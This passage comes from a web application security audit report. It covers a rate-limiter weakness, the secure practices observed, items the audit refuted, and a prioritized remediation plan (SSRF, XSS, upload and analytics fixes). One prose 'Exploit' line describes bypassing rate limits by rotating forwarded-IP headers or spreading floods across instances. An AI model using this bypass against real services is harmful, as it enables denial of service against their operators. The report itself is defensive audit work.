**Remediation:** Explicitly reject `image/svg+xml`, or force a raster re-encode. Set the stored `ContentType` from the validated `EXT_BY_TYPE` map rather than echoing the remote value; add `ContentDisposition`/nosniff at the serving layer.

---

#### I-2. In-memory per-process rate limiter with spoofable IP source provides only soft limits
**File:** `lib/rate-limit.ts:14-60`
**Dimension:** DoS

**What / Why:** The `windows` Map lives in-process, so on serverless/multi-instance hosting each instance counts independently (effective limit = N × configured). `clientIp` trusts `x-real-ip` then the left-most `x-forwarded-for`; if ever served without a trusted proxy overwriting these headers, a client can rotate the header to bypass the limiter. This weakens every rate-limited public endpoint (contact 5/60s, error-log 30/60s, analytics beacons, non-admin presign) and amplifies M-5, M-6, L-9, L-10.

**Exploit:** On multi-instance hosting, spread a flood across instances (each enforcing locally); or, without a header-overwriting proxy, rotate `x-real-ip`/`x-forwarded-for` per request so every request lands in a fresh window.

**Remediation:** Back the limiter with a shared store (e.g. Upstash Redis) and derive the client IP only from a trusted-proxy-set header; document the deployment requirement that the proxy overwrites `x-real-ip`.

---

## 3. Secure Practices Observed

The codebase has real, deliberate defenses — several findings above exist precisely *because* they deviate from an otherwise-consistent secure pattern:

- **Self-guarding API model with DB-revocation-aware admin.** `middleware.ts` guards `/admin` and `/benert-remix/admin` *pages*, and sensitive API routes call `requireAdmin` (`lib/auth-guard.ts`), which **re-reads `User.role` from the DB on every call** so demoting a role-granted admin revokes access on the next request despite a still-valid 30-day JWT. The admin user role-change/grant endpoints (`app/api/admin/users/[userId]/route.ts`) correctly avoid mass-assignment.
- **Correct public/admin field masking on the canonical release path.** `GET /api/releases/[releaseId]` returns `upcCode: isAdmin ? release.upcCode : null` (and `catalogueNumber`/`pLine`/`cLine`), and the shared DTO mappers in `lib/catalog-data.ts` (`mapReleasesToCards`, `getReleaseMeta`) never emit internal rights fields to non-admins. (M-4 is a single endpoint that bypasses this shared shaper — the pattern itself is right.)
- **No object-level IDOR.** Per-user resources (account, newsletter, user-profile, remix entry) key off session identity, never a client-supplied id. The `play-event` finalize PATCH is ownership-scoped (`where {id,userId}|{id,visitorId}`). Outreach CRM by-id routes are global admin resources with no per-user ownership to break.
- **Path-traversal-safe S3 keys.** `sanitizeKey` in `lib/s3.ts` blocks traversal; non-admin competition uploads are strictly confined to a `benert-remix/<sub>/` prefix and bound to `audio/*` content-type in the signed PUT.
- **Output-safe rendering on standard surfaces.** Press cards and public catalog text render as React-escaped JSX (`components/local-ui/PressCard.tsx`); footer social links are validated with `isSafeUrl` (the previously-suspected `javascript:` sink is not exploitable). The JSON-LD sink (M-7) is the specific exception because it uses `dangerouslySetInnerHTML`.
- **Strict CSP on the admin surface.** `/admin` gets a proper nonce + `strict-dynamic` policy (the weakening in L-15 is limited to the public/non-admin surface).
- **Input clamping on analytics beacons.** Track-play clamps duration to `0..86_400` and caps free-text fields (`contentName.slice(0,300)`, `contextName.slice(0,200)`). (L-8/L-13 are the routes that *failed* to copy this pattern.)
- **Consistent admin gating on sibling upload routes.** `presigned-url-image` and `presigned-urls-bulk` both call `requireAdmin` (L-1 is the one route that used the token-only check instead).
- **Rate limiting present on most public write beacons** (contact 5/60s, error-log 30/60s, pageview/track-play/link-click), even if the underlying limiter is soft (I-2).

**Refuted items worth monitoring (not findings):**
- `ADMIN_EMAILS` bootstrap allowlist contains personal Gmail addresses that permanently bypass the DB role check (`lib/auth-session.ts`) — refuted as a live issue but worth periodically pruning, since these accounts cannot be revoked via the DB.
- State-changing API routes rely entirely on `SameSite=lax` (no CSRF token / Origin check). Refuted as directly exploitable, but note that several Medium findings (M-1/M-2/M-3/M-7) explicitly assume a CSRF-forced admin request as one delivery vector; adding an Origin/Referer check would harden those.
- Secure-cookie decision uses `??` instead of `||` (`lib/auth-session.ts`) — harmless under an `https://` `NEXTAUTH_URL`, but would silently produce non-secure cookies if the URL is ever `http://`. Monitor on config changes.

---

## 4. Prioritized Remediation Plan

Ordered by impact/effort. Items marked ★ each close multiple findings at once.

1. **★ Harden `rehostExternalImage` centrally (SSRF).** In `lib/s3.ts:105-138`: resolve DNS and reject loopback/RFC1918/link-local/reserved/metadata IPs, reject non-default ports, set `redirect:'error'` (or re-validate each hop with a DNS-pinned agent), add a fetch timeout, and prefer a positive CDN allowlist. *Closes M-1, M-2, M-3, L-3; contributes to I-1.*
2. **★ Introduce a `jsonLdScript(obj)` escaping helper (stored XSS).** Replace raw `JSON.stringify` in all six JSON-LD sites (`artists page.tsx:118/122`, `releases layout.tsx:90/95`, `press page.tsx:38`, `app/page.tsx:58/64`, `about page.tsx:28`) with the `\u003c`/`\u003e`/`\u0026`/`\u2028`/`\u2029` escaper in `lib/seo.ts`. *Closes M-7.* Then extend the nonce-based strict CSP to public pages (`middleware.ts`). *Addresses L-15.*
3. **Stop leaking internal catalogue/rights metadata.** In `app/api/artists/[artistId]/releases/route.ts`: use `releaseCardListArgs` + `mapReleasesToCards(rows, { isAdmin: false })` (or an explicit public `select`), and add the artist-visibility 404 gate. *Closes M-4, L-7.*
4. **Split the ingest secret and make the comparison constant-time.** Require a dedicated `ERROR_LOG_INGEST_SECRET` (no `NEXTAUTH_SECRET` fallback) in `app/api/error-log/route.ts` and `instrumentation.ts`; compare with `crypto.timingSafeEqual`. *Closes M-8, L-14.*
5. **★ Cap search query length + rate-limit the public search branches.** Add `q.slice(0,64)` and `rateLimit(clientIp)` in `app/api/releases/route.ts` and `app/api/artists/route.ts`, plus a needle-length guard inside `fuzzyScore`/`substringEditDistance` (`lib/fuzzy.ts`). *Closes M-5, L-2, L-9, L-12.*
6. **Fix analytics-metric integrity.** In `track-play` verify `contentId` references a public release/track and record `completed=false` on create; in `play-event/[id]` PATCH clamp `playDuration` to `0..86_400`, restrict `completed` to a one-way `false→true`, and add a rate limit. *Closes M-6, L-11, L-13.*
7. **Use DB-revocation-aware admin on the presign route.** Replace `tokenIsAdmin(guard.token)` with `requireAdmin(request)` in `app/api/upload/presigned-urls/route.ts`, validate `isAudioContentType` on the admin branch, and apply a rate limit. *Closes L-1, L-5.*
8. **Enforce upload size at presign time.** Add a signed `content-length-range` (POST policy) to all presigned PUTs, and make `upload-complete` HeadObject validation fail **closed**. *Closes L-4, L-6.*
9. **Rate-limit and bound the remix flow.** Add `rateLimit(token.sub)` to `upload-url`/`upload-complete`, gate user auto-creation behind it, and cap `releaseName.slice(0,200)`. *Closes L-8, L-10.*
10. **Reject `image/svg+xml` and set `ContentType` from the validated map** in `rehostExternalImage`; add `nosniff`/`ContentDisposition` at the serving layer. *Closes I-1.*
11. **Back the rate limiter with a shared store** (e.g. Upstash Redis) and derive client IP only from a trusted-proxy header. *Closes I-2; strengthens items 5, 6, 8, 9.*
12. **Monitoring / hygiene (from refuted set):** add an Origin/Referer check to state-changing routes to harden the CSRF delivery vector behind items 1–2; prune personal Gmail addresses from `ADMIN_EMAILS`; change the cookie-secure `??` to `||` in `lib/auth-session.ts`.